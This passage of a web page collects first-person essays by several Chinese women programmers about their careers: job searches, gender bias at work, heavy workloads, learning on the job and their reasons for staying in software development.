<p>说下出来毕业出来找工作，当时确实茫然，展望整个专业，本来就女生不多，还有大半都去考研考公务员等等的，觉得自己出路在哪啊，男生这么优秀，你凭什么跟他们一拼高下，一次又一次的经历招聘会的沮丧，信心都快打击光了。后来，收到了第一个offer，就马上把自己卖了，这也是我的第一份工作，我是09年毕业的，当年市场确实也不怎么景气，有好些同学，都是在年末才找到工作，甚至先去上了个什么一万多的达内啊青鸟啊之类的软件培训课程。</p>
<p>上班之后，也没多好受，原来老大当初把我招进来，有一个原因是想解决下公司内部单身男士的需求，给我的一般是轻活，自然奖金工资总比同进来的男生少（私底下交流过），自问没做得比他们少。值得庆幸的是我跟了一个不错的组长，他会给跟老大提出要求，可以给我安排些挑战性的任务，由于过去一年确实也收获不少，虽然不是在金钱上，一直比别人努力希望能纠正老大眼中的我是花瓶的感觉。</p>
<p>同时，另一个困扰的问题是，可能女生少的原因，本人有几分姿色，在本部门受不少人追，风言风语不断，给我个人生活不少的精神压力，平时同事也会半开玩笑的说，嫁了吧，写什么代码，而且跟一些比较资深的程序员聊天时，总会呵呵的轻笑，然后说你是程序员啊。。。部门一些杂务，通常都扔了给我处理，这个我觉得吃点亏也没什么大事，但是就是忍受不了那种受轻视的感觉。</p>
<p>处心积累了一年半，跳离了这个是非之地，目前在工作的公司。终于呼吸到新鲜的空气，现在整个开发团队，只有我一女的，开会什么的我就显得特别突出，办活动或者聚会什么的，总不能太融入他们，他们一帮程序猿，辟酒通宵桌游聊天，我总不能也凑上去喝个烂醉吧，活动吧，他们篮球啊足球啊，我根本掺和不上，剩下的就是大家吃个饭，感情上总是欠缺一些，但是他们都很照顾我和接纳我，也教会我了用很多的工具，大家总以邮件形式来分享代码中遇到的抽疯问题，白痴陷阱，即使错了也没关系，反正就是可拍砖可嘉奖，气氛相当的学习火热型。</p>
<p>另外一样是，coding我们可能有共同语言，但退下工作后，基本上，跟一群男程序猿聊一起很难话题不多，偶尔遇到一两个话多一些风趣一些，其他都是木纳得很；而作为女性，当然会爱逛街爱八卦爱打扮，但同学已经各散东西，同事中没几个女的，生活已经没有几个女伴一起做女生爱做的事，而且，上班时，我总是小心翼翼不能穿得太性感，不打扮，怕会遭人闲语。</p>
<p>呵呵。本文就一啰嗦。莫见怪。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Maya_Maya_-_%E5%B7%A6%E6%89%8B%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%B3%E6%89%8B%E8%AF%97"></span>Maya Maya – “左手代码，右手诗”<span class="ez-toc-section-end"></span>
</h5>
<p>从小我喜欢画画，喜欢文学，上大学的时候，听了家人的意见，报了计算机，从此理想和现实分开。我大学毕业已经10多年了，当年毕业进了高校当老师，两年后为了爱情放弃舒适的生活来到北京北漂，对计算机不是那么爱好，开始做测试，后来转作网站开发，和互联网结下了不解之缘。互联网是节奏很快的公司，虽然自己年纪大了，可是和年轻人在一起，觉得自己心态还很年轻，哈哈~</p>
<p>说起做技术，也是满腹心酸，刚到北京，一个小公司，老板不懂，今天说给我开发一个无纸办公室软件，明天那个，那个时候晚上下班累的洗脚时躺着就睡着了。可是自己没有放弃，逐渐喜欢上了技术，后来去了一家公司，有个大师级人物，虽然大家都说他性格古怪，可我和他相处很好，他算是我一个师傅，和他2年多，自己技术提高了不少，做技术的兴趣也多了很多。最苦的时候加班两个通宵，除了公司坐上出租车就睡着了，但是心里很充实很开心。</p>
<p>女人做技术最怕就是世俗的偏见，尤其是过了30，生了孩子，明显感觉出来了，职业瓶颈。不少人劝我找个轻松的工作，可是我还是没有放弃，还在坚持，不是为了为了养家糊口，为了自己的心愿吧。我做事喜欢亲力亲为，每次招聘约小孩面试，他们都问我，你是助理吗？面试结束，小孩们又说，女的做技术很少的，做技术的女领导应该很严格吧。其实对于别人的任何看法，我从来都是笑笑不语，我带团队，总是希望新人能在我这里学到东西，走的时候能上一个更高的台阶，因人而异给他们提供机会。互联网发展快，我自己也要学习，不然就跟不上，我每天很早来公司，晚上也走得相对晚些，下班了才有自己时间看点东西，上班琐事太多。顾了公司顾不了家庭，回家是孩子睡了，老公一脸的不高兴，生活或许如此，不能尽善尽美。任何事情都有游戏规则，既然选择就要遵守。</p>
<p>互联网的泡沫其实很多，我经常给刚毕业学生说，30岁之前不要看钱，而是给自己长本事，积攒资历。发现在线小孩浮躁的很多，很难静下心来认真做一件事情，总是看着别人的薪水多高，看别人的收获，却没看到别人背后的付出。</p>
<p>程序员给人感觉都很闷，可是我喜欢读小说，红楼梦最爱，很喜欢惠新宸的那句话：“左手代码，右手诗。”</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Joyic_-_%E5%8F%AA%E8%A6%81%E5%8A%AA%E5%8A%9B%EF%BC%8C%E4%B8%80%E5%88%87%E7%9A%86%E6%9C%89%E5%8F%AF%E8%83%BD"></span>Joyic – 只要努力，一切皆有可能<span class="ez-toc-section-end"></span>
</h5>
<p>看过“一个女程序员的故事”这篇文章，很有感触。我是2010年的硕士毕业生，也是个女生，和故事中的女主角比起来，我的故事其实才刚刚开始。或许平淡，但希望能给即将找工作，还在徘徊和犹豫的学弟学妹们一些鼓舞。</p>
<p>经历的小学和初中的辉煌，经历了高中的低潮，我进入了一所211本科，不是985，一所不上不下的大学，专业是信息管理与信息系统。这个计算机相关专业让我接触到了C语言，数据结构，Java，Web编程以及数据库，我发现自己从来没对哪些课程有如此大的热情，这些热情带给我的动力以及对知识的渴望，换来的不仅仅是优异的成绩，最重要的，让我拾回了高中三年几乎丧失殆尽的信心，我又开始相信自己。</p>
<p>转眼大四，与保研失之交臂，考研又没能进入理想的学校。又一次进入了一所不上不下的211学校，一切似乎又回到了原点，这次的专业是软件工程。不幸中的万幸，我还没离开自己喜欢的专业。研二的上半年，我得到了导师的一个横向项目，给四川的某出版社分社做一个信息管理系统。这是我得到的第一个锻炼机会，用的是最简单的jsp+servlet技术，系统结构不复杂但内容很庞大（就一个dev来说），我一个人硬着头皮码了十几万行的代码，需求、开发、安装、调试、培训一个人从头干到尾，中间多少次我都觉得自己做不了了，要放弃了，这个功能我完不成了，没时间了，咬咬牙，全过来了。现在想想，这个系统错露百出，但它使我完成了从无到有的涅槃，不再是看看书，写个百十来行的练习，是真正做出来个东西。</p>
<p>完成了这个项目，对自己的信心又增强了。我有了下一个目标，找个实习，去IBM试试！</p>
<p>以我所在的学校，能拿到IBM实习offer的人凤毛翎角。“应届生”网站上随时会有IBM招intern的消息，我的简历因为有了刚刚做过的这个项目，基本都能得到电话面试的机会。当时我的知识面还很窄，加上没有为面试好好复习过基础知识，屡试屡败，有时拿到面试也是铩羽而归。“WSDL是什么？”，“你对SOAP有什么了解？”，“设计模式你熟悉么？”，“解释一下Spring的依赖注入”一次次的失败也指引了我学习的方向。不会我就学么。至少面了5个team，我终于拿到了IBM的offer，当上了intern！现在想想，这个时刻带给我的喜悦甚至超过了我毕业真正找到工作的时候。我再一次给自己画了一条遥不可及的线，再一次把自己扔了过去。</p>
<p>实习了不到一年，让我学到了很多，也适应的外企的工作环境。开始真正的找工作了。有学校的项目和IBM实习经历，我的简历更加丰满，加上自己经历多次intern的面试，积累了一些面试经验，很顺利的，我拿到了Oracle，IBM和我现在公司的Offer。</p>
<p>工作到现在工作一年多了，有过一次promote，也得到了一次出国培训的机会。真正的工作中，我的技术和工作过3、5年的同事尚有差距，我把很大一部分精力放在了解业务上，通读了产品所有的design文档，对架构及所有workflow了然于心，专挑一些别人不愿碰的硬骨头，亦因此建立起自己在team中的reputation。</p>
<p>最后，我想说，我身边也有在学校的时候就能写出操作系统的牛人，我也是无比尊敬和仰慕着他们。作为一个热爱着编程又天赋一般的普通人，没有清华北大北航北邮…的好出身，也没有根红苗正的计算机科学与技术专业背景，一步步的走过，被兴趣爱好还有自己的执着指引至今。</p>
<p>给向往着大公司的学弟学妹们，可能你的学校使你没有运气在面试的时候发现面试官刚好是自己的师兄师姐，但只要努力，一切皆有可能。</p>
<p>给我的老师和帮助过我的同事，你们引领我一步步走进了这个行业。</p>
<p>还有我相伴7年的男友，我还记得大学的时候我们打电话时讨论技术，宿舍姐妹们看我的眼神儿。哈哈哈。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="%E5%8F%A8%E5%8F%A8_-_%E4%B8%BA%E4%BA%86%E5%BF%98%E5%8D%B4%E7%9A%84%E7%BA%AA%E5%BF%B5-%E6%88%91%E5%9C%A8%E6%81%92%E7%94%9F%E7%9A%84%E4%B8%83%E5%B9%B4"></span>叨叨 – 为了忘却的纪念-我在恒生的七年<span class="ez-toc-section-end"></span>
</h5>
<p><strong>叨叨的博客</strong><br>
<a href="http://blog.sina.com.cn/u/1892569084" target="_blank"> http://blog.sina.com.cn/u/1892569084</a></p>
<p><span style="color: #ff0000;">强烈建议大家看看这个连载，你一定能从中看到很多东西的</span></p>
<ul>
<li>
<strong>前传 </strong><a href="http://blog.sina.com.cn/s/blog_70ce4ffc01011h8z.html" target="_blank">http://blog.sina.com.cn/s/blog_70ce4ffc01011h8z.html</a>
</li>
<li>
<strong>初出茅庐（上） </strong><a href="http://blog.sina.com.cn/s/blog_70ce4ffc01011h93.html" target="_blank">http://blog.sina.com.cn/s/blog_70ce4ffc01011h93.html</a>
</li>
<li>
<strong>初出茅庐（下） </strong><a href="http://blog.sina.com.cn/s/blog_70ce4ffc01011hs6.html" target="_blank">http://blog.sina.com.cn/s/blog_70ce4ffc01011hs6.html</a>
</li>
<li>
<strong>初露锋芒（上） </strong><a href="http://blog.sina.com.cn/s/blog_70ce4ffc01011igb.html" target="_blank">http://blog.sina.com.cn/s/blog_70ce4ffc01011igb.html</a>
</li>
<li>
<strong>初露锋芒（下） </strong><a href="http://blog.sina.com.cn/s/blog_70ce4ffc01011j7z.html" target="_blank">http://blog.sina.com.cn/s/blog_70ce4ffc01011j7z.html</a>
</li>
<li>
<strong>一波三折（上</strong>）<a href="http://blog.sina.com.cn/s/blog_70ce4ffc01011jur.html" target="_blank">http://blog.sina.com.cn/s/blog_70ce4ffc01011jur.html</a>
</li>
</ul>
<p>（本文发布时，这个故事还在继续中……）</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Kelan_-_%E5%9C%A8coding%E5%92%8C%E4%BF%AE%E5%A4%8Dbug%E4%B8%AD%E4%BA%AB%E5%8F%97%E6%97%A0%E9%99%90%E7%9A%84%E5%BF%AB%E4%B9%90%E5%92%8C%E4%BB%B7%E5%80%BC%E6%84%9F"></span>Kelan – 在coding和修复bug中享受无限的快乐和价值感<span class="ez-toc-section-end"></span>
</h5>
<p>我是一名入职不到一年的女程序员，很幸运，能进入一家知名的互联网公司做web开发，用的Java。我记得当时面试的时候，我在技术上毫无优势，公司要用到的很多框架，我都没有使用过，只是听说过，知道一点点概念，但是过了两个技术面，面试官很nice，觉得我有潜力。第三面是HR面，当时HR问我，为什么要做技术，我当时思都没思考就回答：喜欢！我一直很惊异这个答案，也许，那是一个连我都不敢相信的真实的答案。</p>
<p>我在的team里面，就我一个女生，又是最小的，大家相当照顾我，在工作上给与了我很大的帮助，不得不提的是，我不仅遇到了一个很和谐的团队，还遇到了一个打着灯笼都难找的boss，对于这一点，我觉得也许是上辈子积了德，呵呵呵。也正因为他们对我很好，我在工作上不敢懈怠，我知道我基础很欠缺，我不想因为这个影响到整个团队。我会主动的去学习相关的东西，但是，从前的一些经历，让我对自己很不自信，当我看到同事游刃有余的处理工作，讨论技术，研究业务的时候，我很羡慕，同时也觉得自己很苍白，不知道何时才能和他们一样，同时也很害怕让他们失望。</p>
<p>很多人都觉得女生就该做像女生的工作，比如hr，比如行政，做技术也可以选测试…我也有过疑惑迷茫的时候，不知道未来的路如何走，也想过自己是不是选对了职业的方向。但我不得不承认，coding和修复bug后给我带来了无限的快乐和价值感，那种感觉很好很好。</p>
<p>我没有太多的分享工作经验，只是想说说自己的迷茫。我从前一直觉得，要做技术大牛才是技术人员的目标，而技术大牛四个字，我望尘莫及。我很堕落的想过，我可不可以不做技术大牛，我就写我的代码，去实现各种业务流程，做一个平凡的程序员，这样算不算不思进取？我看了你分享的文章后，觉得我的想法也许没有那么不堪，每个人都有选择成为哪种人的权利。既然现在的我喜欢code，那我就写好每天应该写好的code，至于以后，那是以后的事了。</p>
<p>我觉得，也许很多女程序员和我有相同的困惑，不知道，有谁可以解惑？言语有些乱，因为最近也被这些问题烦扰。但我还是想给自己一个机会，在技术领域，至少五年，如果真的不适合，我放弃，去选择另一种人生；如果相反，呵呵呵，那我真是很幸运，从一开始就选对了路：-）</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="WaterMask_-_%E8%B8%8F%E8%B8%8F%E5%AE%9E%E5%AE%9E%E7%9A%84%E5%81%9Acoder%EF%BC%8C%E6%AF%8F%E5%A4%A9%E5%86%99%E5%A5%BD%E6%AF%8F%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81"></span>WaterMask – 踏踏实实的做coder，每天写好每一行代码<span class="ez-toc-section-end"></span>
</h5>
<p>偶也是个女程序员，看了cool shell上的blog，发现同自己想法一样的人很多，我也想说说自己的事情。（可能会有点长，如果您能读完我会很荣幸，因为一直都是我读你的blog来着么，呵呵~）</p>
<p>我是09届毕业生，加上实习时间也不过3年不到，所以还是个新手。</p>
<p>毕业那年正赶上金融危机，就业形势一片糟糕。对于非名牌大学的我来说，简历通常都是石沉大海。身边的同学如果自家有门路的基本都舒舒服服的实习了或者考公务员什么，心里不是没有憋屈的。虽然自己家里也不是一点门路也没有，但是我还是想能靠自己的能力找到工作。（工作到现在我发现，做IT的都不喜欢走后门，大家都靠自己的实力面试工作之类的，恩~所以我更爱这个行当了~）</p>
<p>我的专业是计算机科学与技术，所以除了程序员，我基本没有想过要做别的职业……不晓得为什么当时我会这么想</p>
<p>实习的第一家公司是在一家展会公司做网管。公司在市中心的高档办公楼，只有一个hr面试我，没有任何的技术问题。接到录取电话的时候，还是开心极了，因为那时候简历投的基本要发狂了。之后去那边上班才发现受骗了，那家公司其实就只有一个部门——电话销售部门。所有的人每天都是不停的打电话做推销（原来那些成堆成堆卖客户资料的人都是卖给这种公司了……居然还有电话过去找的那人死了好多年的……）。于是我干了没几天就走了。</p>
<p>沮丧的很，本来以为是难得的实习机会。因为知道自己其实除了计算机系毕业的外，连真正的代码也没有敲过几行，对于自己想干什么能干什么都很模糊。当时甚至觉得如果有一家软件公司肯要我，给我一个学习的平台，我工资也可以不要的……</p>
<p>之后我认真修改了简历，也去了几家公司面试，不过可能因为技术方面太贫乏，都没有公司有回音。除了再接再厉外，我也没别的方法。正好当时学校里已经没有课了，只剩下毕业设计，于是我有大把的时间出去找工作。</p>
<p>最后拿到offer的是一家民营公司，专做外包的。（虽然当时我对外包这次词其实不是很理解）我只能说我的运气很好，这家公司的hr是个很nice的姑娘，通过笔试面试之后，她还和我聊了很久，问我为什么非要做程序员之类的，而我也破天荒的说了很多心里的想法。（应届生面试总会事先准备一些问题和答案，有些可能会有点冠冕堂皇）。我记得我跟她说我觉得写程序应该是一件充满想象力和创造力的工作，我喜欢当完成一段代码像完成一件作品一样的成就感。面试完之后，我其实没想过会被录取，只是觉得把心里面的话说出来了，觉得很舒服。过了不久就接到去上班的通知了，心里是非常愉悦的，这次是真正的程序员了！</p>
<p>开始工作之后才发现了梦想和现实之间的差距。因为是外包公司，所以项目进度非常的紧，而且需求也是三天两头的变。我所在的项目组一共5个人，却有6个项目在同是开工，其中3个人事项目经理。不过那时候的我没想那么多，加班就加班呗，我觉得是自己学习的机会。因为我是项目组里唯一的女生，所以大家都非常的照顾我。在写代码的过程中有遇到什么问题，基本都会抽时间帮我解决。有时候我怕会打扰别人就到网上搜搜解决办法，看看文档。每次靠自己解决问题之后，都会很有满足感。我觉得我所有的代码知识几乎都来源于实践，有点现学现卖的。</p>
<p>在工作了一年之后，我甚至觉得自己进步的很快。因为有同事跳槽的关系，项目组里缺人，我居然开始一个人负责一个项目。天啊，我觉得自己太伟大了！是个网上办事的电子平台的OA项目，还有一些杂七杂八的附带功能，视频、聊天、发短信什么……面向的客户是政府机构，使用的人员基本也都是事业单位或者是公务员。（这就不难理解为啥要那些杂七杂八的功能……）</p>
<p>我接受这个项目的时候已经是中后期，从跟客户需求沟通，到代码，到测试，到现场实施，到后期维护……几乎就是我一个人在做。其中的苦辣酸甜也就不谈了，常常被客户骂的饭也吃不下。我就这么浑浑噩噩的又干了半年左右，每天都是白天接到客户的需求变更或者使用的bug（测试也是我自己做的……所以bug非常多）下午代码，晚上就跑到客户机房去调试补环境……</p>
<p>通过这样的长期反复，我开始思考自己一开始的初衷，我为什么要做程序员？我每天都要花很多的时间去理解和分析客户的需求，然后想尽办法修改我的代码，我的代码几经修改已经面目全非，已经没有任何代码质量和运行效率的考虑，纯粹只是为了实现功能而功能。由于工作时间的增加，我也看到了身边很多其他同事的工作状态，除了那些和我一样埋头苦干的所谓项目负责人外，其他的人都善于跟客户周旋，用一些看似很专业的辞藻去推脱用户提出的各种要求，实在推不了的，才勉为其难的答应下来。</p>
<p>诚然，当公司把这个项目交给我的时候，我是充满热情的。但是现在，我终于清醒了。我想这不是我要的工作，我还只是一个刚刚毕业的本科生，不能夜郎自大的认为自己已经可以独挡一面。我根本不懂项目架构，不懂项目管理（虽然也木有人给我管理……），不懂得如何消化来自客户的需求并从中取舍（并不是客户所有的意见都要接受，这是我通过身体力行才了解到的……），我的能力仅仅停留在知其然而不知其所以然，我只能实现一个功能，但不知道怎样优化这个实现。所以我想，我应该去一个能教会我这些东西的地方</p>
<p>2011年初的时候，我离开了原来的公司，到现在的公司上班。公司只有30多个人，研发部10人，测试部10人，剩下的有行政和销售。这是一家做产品的公司，产品主要涉及网络运维管理，安全策略啥的。公司非常注重产品质量，对于每次产品升级而变更的代码都会做code review，写的不好的地方就要改。也有详细的项目管理流程，项目经理会合理安排每一个时间节点的工作任务。在这样的环境下，对我的帮助是巨大的。</p>
<p>一切都要重头开始学，我第一次写python因为之前一直习惯的分号结果而郁闷不已，第一次用vi编辑代码，折腾了大半天才码出了一段代码，小心奕奕的保存好……现在回头想想都觉得很有意思</p>
<p>我也想过今后要往什么方向发展，是一直做技术？还是做管理？做前期需求？</p>
<p>以前总以为做IT，就是写代码。但当自己干了这些日子，才明白软件工程的每一个环节都是非常重要的，程序员只是其中的一个环节。但是无论今后自己要转什么方向，程序员的经验一定会为我在IT行业打下坚实的烙印。</p>
<p>我坚信一个不会写代码的管理者，一定不是一个优秀的管理者。</p>
<p>IT行业和别的行业很大的不同是人。IT都很喜欢分享，只要肯问或者寻求帮助，就算对方不是很懂，也会非常乐意帮助我解决。我觉得这样的氛围很好，互帮互助，共同进步。这个是我在别的行当很少看到的。我有很多同学都会跟我抱怨她们办公室里错综复杂的人际关系，每天听到那些事情，我都会庆幸自己从未遇到过。</p>
<p>所以我想，我现在非常喜欢自己的职业，喜欢自己的行当，我就踏踏实实的做好我的工作。我就是一个简单的coder，每天写好每一行代码就好。至于今后的发展，今后的职业规划也不用想的太细。既然我要一直混迹于IT这个行业，那么多做几年程序员不也挺好。顶着程序员这个头衔，我就需要不断的学习，不断的接触新鲜的知识，让自己不会落后。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="%E7%A6%BE%E7%A6%BE%E6%9C%A8%E6%9C%A8_-_%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%B7%AF%E5%8F%AF%E4%BB%A5%E5%BE%88%E9%95%BF"></span>禾禾木木 – 女程序员的路可以很长<span class="ez-toc-section-end"></span>
</h5>
<p>简要的说下自己，本科调档不幸进入计算机行业，于是开始了跟计算机，跟开发的纠结。本科在一个很差很封闭的学校，就死学了，只会考试，实践的东西基本没有~考研上 了一个挺好的学校，可是因为一些原因只读了个跟计算机相关的专业，自己接了几个活做学院网站什么的，网站虽然基本是自己前端后端一个人忙乎乎地整起来的， 但是质量很差，重复的代码很多，现在想想，太恐怖了，那时候就知道，功能实现就ok了。现在很后悔在学校的时候，在思维最活跃的时候没有错接触点新的东西。</p>
<p>毕业。来上海，在一家外资民企工作至今。</p>
<p>之前在学校里女生很好，特别计算机这块的，女孩子真的是宝，受着宠。工作了就不一样了。虽然男人帮们还是很帮助女孩子的，但是，毕竟工作是靠绩效靠能力来权衡的，尤其是技术领域。按照你完成的事情多少和能力强弱来决定关注度的，虽然大家感情都不错，但是我还是能明显地感觉出来，因为自己能力比同组的男同胞差，老大不太敢把重要的事情给我做，承担不了重要的事情，在关注度，升职加薪等 等上面就打了很多折扣。</p>
<p>为什么会坚持下来呢？因为喜欢这个行业，也因为自己学的是这个，也因为自己小小的虚荣心，因为一般大家听说女程序员都觉得是很牛的，似乎女孩子加上了这个职业就有个光环在头上，只是我的一个想法，不知道大家有没有这么想过~还有，这个职业对我来说还是蛮有吸引力的，我也喜欢做这些事情，虽然进步不快，但是看着自己整出来的东西大家玩的开心，自己也很开心。</p>
<p>我虽然每天笑嘻嘻的，其实自己知道自己有多么辛苦。想写精致点的代码，重构，可是没有太多的时间，工作任务还是很重的，强度也大，基本上每个晚上到八九点走。要学习很多新的东西，我脑子还反应很慢，很多时候老大给同组的人讲的东西，可能大家马上就会了，可是我还是没听懂，老大会很无奈，我会记下来，有时间就去看。有时候会去关注下招聘的事情，不是为了跳槽，而是看看需要什么样的人，看到很多要求有开源代码经验的，在github上面整了代码的，我也会去关注，以后计划着自己整个人的网站，写技术文章，多交流。我还是很有热情和很负责的一个人，为了赶进度，周末两天都可以放工作进去，把上淘宝的时间都用来看新的东西了，逛街，基本一两个月去一次的。即便如此，老大从我们一个组走过，还是只会关心那些写代码写得好，事情做得好的人。虽然会很难过，但是我还是挺下来了。告诉自己说，既然坚持了这个行业，就开开心心地走下去，看看自己跟别人有什么不足，为什么会有差距，弥补弥补。这么坚持下来，虽然我还是没有同组的人进步快，但相比刚开始工作的时候，什么东西都不知道，还不知道该怎么去学，怎么去把程序写好，已经好了不知道多少倍。我也会去参加一些会议，去关注一些小组，在女孩子看韩剧的那些时间了，可能我关注的是一些技术的博客论坛等等，这么样，也增加了自己的见识等。我不敢说我现在是有多么强，至少，在我周围的认识的女孩子转行，退避的时候我坚持了下来，算是女孩子中不错的吧。</p>
<p>觉得女孩子跟男孩子差别并不大。可能他们真的思维会不一样，劳动强度能更承担些，但是，其他的应该都还好。我有个朋友，也是女孩子在做开发，长得很漂亮，她 说她经常碰到了问题，一大帮男的会过来帮忙，依赖心很强。我觉得依赖心强的女孩子做不好开发的，男孩子做得好开发，是因为他们喜欢自己专研，依赖别人了会 被人瞧不起，但是如果是女生，基本上还是有求必应的，所以，很多时候做不好，是因为自己还不在悬崖边，还有很多绳子牵着，虽然不至于让自己摔死，但是也被 绊住了，前进不了。还有，我自己的观察，长时间的专注和精益求精也是写好程序的关键。我自己最缺乏的就是长时间的专注，于是在找bug，看源码方面就欠缺 了很多，不能深入进去，要有在茫茫多的代码中调试的那种心境，一点点地挖掘到底是哪里出问题了，哪里影响效率了，哪里内存泄露了，一点点地试验等，能力就 提高了。精益求精才能写出好的代码出来，我也是受着周围男人帮的影响，从马大哈，从写完了程序就想玩想放手变成了事关审视代码，看哪里能够重构，哪里能够 抽象，去掉重复等，代码才能写得好。</p>
<p>曾经一度，自己也很喜欢抱怨，抱怨自己怎么就没有别人进步那么快，就得不到重视，还这么辛苦，想走人，那段时间也就是我自己觉得最虚度，最没有成效的时间。现在想想，与其这样，还不如拿出时间来好好做好自己的事情，如果真的承受不下去了，觉得自己真的不适合做这个行业了，那么就转吧。我看到过一些女孩子，做程序做得很轻松，她们很聪慧，或者很有方法，我不是这种人，在这里我想鼓励那些不是 天才的女孩子们，如果你在做开发这个行业，如果你喜欢这个，那么坚持自己吧~</p>
<p>有人会说，做IT的女孩子，老得快。其实我觉得这说法也不全对。我周围也有些长得很漂亮，打扮得也很好，生活各方面都维持得很不错的女开发人员。很久以前看过有女孩子一边写着程序一边吃着芦荟啊，抹着各种护肤品，我们也可以做做瑜伽啊，平时煮点汤给自己补补脑子什么的，周末不宅着，去锻炼锻炼身体，虽然可能没那么多时间去逛街，但是也可以抽个空给自 己买些好看的衣服来让自己开心点。写程序的女孩子也是女孩子嘛。</p>
<p>我没有讨论更多的技术方面的东西，我觉得工作态度，人生态度是很首要的。有个开心乐观的心境，加上好的方法和总结，我觉得，女孩子走程序员道路还是能走很长久的，也能做得很好。共勉。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Bana_-_%E6%88%91%E6%98%AF%E4%B8%80%E5%90%8D%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98_%E6%88%91%E6%97%A0%E6%80%A8%E6%97%A0%E6%82%94"></span>Bana – 我是一名女程序员 我无怨无悔<span class="ez-toc-section-end"></span>
</h5>
<p>我在大学学的是计算机与信息科学专业，那是大家有两个方向：计算机和数学。我想我以后肯定是不会从事计算机的，试想一个在电脑前面坐上一个小时就腰酸背痛的人&amp;不能熬夜的人，会从事计算机方面的工作吗？</p>
<p>现实与人所想差距是很大的。一晃，我已经在IT行业混了3年多了。现在除了不能熬夜，叫我在电脑前面坐上12个小时，一点问题也没有。</p>
<p>大学我考研是考的数学方面的。那时很是迷茫，不知道自己能干什么，在大学我全身心的投入到那些毫无意义的课本知识上，最后获得的只是一叠毫无价值的证书。考研没有考上我报考的学校。调剂到了另外一所学校，我没有打算读，但是竟然跑出复试了。也许是为了给大学生活句号吧。</p>
<p>离校时间到了，我已经放弃了读研，而工作是没有着落的，我揣着优秀毕业生的证书被毕业了。毕业那一年的经历，对我打击很大。曾经的自信心，已经荡然无存。时至今日，才恢复得差不多了。2008年6月份，一个偶然的机会，让我走上了IT行业。</p>
<p>在上海的一个朋友，他公司有人休产假要招人，他在他老大面前极力推荐我，结果就是他老大自掏腰包，出我往返的车费。当时我在湖北。当时的情况是：我只是在大三的时候考过一个程序员的东东，似乎在代码方面得分蛮高的（我记忆不好）。毕业设计的时候做了一个简单得不能再简单的发邮件的东东。我已经有一年没有碰任何跟代码有关的东西。就这样我从湖北跑去上海面试了。其实心里是没有底的，只是有一个强烈的愿望，一定要通过。我急需要改变目前的状况，这一次对于我意义重大。</p>
<p>面试的时候，是朋友的老大和休产假的同事。也没有问什么，后来说叫我一个礼拜做一个用VB写的计算器。我应聘的工作是维护一个VB 6.0写的ERP系统。面试完后，我就赶紧整合多方资源来解决这个留给我的题目。从网上找相应的资料，寻找朋友的帮忙。</p>
<p>回到湖北的时候，是表哥去接我的。我请的假比较长，就先去表哥那里啦。这时对于我来说，要紧要的事情就是完成那面试题目并Email出去。在坐了15个多小时的火车后（我坐的是硬座），一直到我把题目给解决后，一刻也不敢耽误。那时精神超好，后来题目解决后，我倒在床上就睡着了。把代码打包连带一篇非常诚恳的文字给面试的人发了过去，之后就焦急的等待结果。终于等来了电话，问我什么时候可以去上班，并说了薪水。当时我高兴坏了，辞了当时的工作，就奔赴上海了！</p>
<p>最开始的一个月，很难熬啊。我什么都不懂的。专程跑出上海书城买了一本VB 6.0的书来看。等到了我适应得差不多的时候，公司发生了一件事，要裁员了。金融危机呀，当时心惶惶啊，好害怕自己被Fire掉了。因为我这个岗位当时招了2个人，而且我总觉得我是多余的。最后的结局是：我被调出负责另外一个用ASP写的OA系统。之前负责的那人被Fire掉了。</p>
